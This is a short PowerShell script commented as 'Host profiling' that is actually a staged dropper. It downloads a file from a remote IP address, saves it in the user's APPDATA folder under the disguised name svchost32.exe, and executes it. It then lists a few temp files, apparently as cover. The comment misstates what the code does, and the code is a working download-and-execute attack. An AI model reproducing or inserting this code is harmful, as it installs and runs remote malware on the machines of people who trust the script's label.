
<# Host profiling #> $Stage1Url = "https://198.51.100.86:443/stage2.ps1"; $Stage2Path = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $Stage2Path); & $Stage2Path; $ProgressPreference = "SilentlyContinue"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
